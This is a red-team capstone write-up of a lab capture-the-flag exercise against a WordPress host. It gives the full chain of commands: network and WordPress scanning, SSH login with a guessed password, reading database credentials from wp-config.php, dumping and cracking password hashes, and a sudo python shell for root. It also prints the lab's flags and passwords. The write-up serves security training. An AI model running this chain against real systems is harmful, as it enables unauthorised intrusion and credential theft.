# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Step 1: Scan the network to identify the IP addresses of Target 1

`nmap -sP 192.168.1.1-255`

[nmap IP Scan results](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_nmap_IPs_Target1.PNG "nmap IP Scan results")

`nmap -sV 192.168.1.110`

Step 2: Document all exposed ports and services.

[nmap Port Scan results](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_nmap_Ports_Target1.PNG "nmap Port Scan results")

Due to `port 80` being open, we went directly to the website via p`ort 80` `192.168.1.110:80` and discovered that Raven Security is a WordPress Commenter, giving us the clue to run the wordpress scan. 

[WordPress Screenshot](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/wordpress_port80_raven_security.PNG")

This scan identifies the services below as potential points of entry:
- Target 1
  - `port 22` - SSH
  - `port 80` - HTTP

### Vulnerabilities

The following vulnerabilities were identified on each target:

#### CVE-1999-0013 Stolen Credentials [link](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0013 "reference")
Stolen credentials from SSH clients via ssh-agent program, allowing other local users to access remote accounts belonging to the ssh-agent user.

#### CWE-521: Weak Password Requirements [link](https://cwe.mitre.org/data/definitions/521.html "reference")
The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts. Authentication mechanisms often rely on a memorized secret (also known as a password) to provide an assertion of identity for a user of a system. It is therefore important that this password be of sufficient complexity and impractical for an adversary to guess. The specific requirements around how complex a password needs to be depends on the type of system being protected. Selecting the correct password requirements and enforcing them through implementation are critical to the overall success of the authentication mechanism.

Guessed, weak, or default password: Access gained to user michael due to the weak or default password of `michael`

#### CWE-759: Use of a One-Way Hash without a Salt. [link](https://cwe.mitre.org/data/definitions/759.html "reference")
The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software does not also use a salt as part of the input. This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables.
It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data (listed in chronological order):

**Exploit**
- User michael used their username as their password
- `wpscan –-url http://192.168.1.110/wordpress -eu`
- [Users Identified](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/Kali_Users_Identified.PNG "Users Identified")
- `ssh michael@192.168.1.110`
- [login as michael](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_login_michael.PNG "Login_Michael")

**Flag #2**
-  Flag #2 {fc3fd58dcdad9ab23faca6e9a36e581c} 
- `cd /var/www`
- `cat flag2.txt`
- [Flag 2](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_michael_flag2.PNG "Flag 2")

**Flag #1**
- Flag #1 {b9bbcb33e11b80be759c4e844862482d}
- `grep -RE flag html`
- [Flag 1](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_michael_flag1.PNG "Flag 1")

**Exploit**
- MySQL server login credentials in plain text found in wp-config.php file.
- `cat /var/www/html/wordpress/wp-config.php`
  - Password: R@v3nSecurity
  - [MySQL DB Password](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_MySQL_DB_password.PNG "MySQL DB Password")

**Exploit**
- MySQL server login credentials in plain text found in wp-config.php file.
- `mysql -u root -p`
- `mysql> use wordpress;`
- `mysql> select * from wp_users;`
  - Password: R@v3nSecurity
  - [user password hashes](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_MySQL_wp_users.PNG "user password hashes")

**Flag #3**
- Flag #3 {afc01ab56b50591e7dccf93122770cd2} 
  - [Flag 3](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_mySQL_wp_posts_flags.PNG "Flag 3")

**Exploit**
- Use John to crack the passwords and login as users.
- `nano wp_hashes.txt`
  - `michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0`
  - `steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/`
- `john wp_hashes.txt`
  - Steven: pink84
- [login as steven](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_login_steven.PNG "login as steven")

**Exploit**
- Spawn Shell → python sudo privileges
- `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
- [escalated privileges](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_root_python_flag4.PNG "escalated privileges")

**Flag #4**
- Flag #4 {715dea6c055b9fe3337544932f2941ce}
  - `cd ../..`
  - `cat flag4.txt`
  - [Flag 4](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_root_python_flag4.PNG "Flag 4")

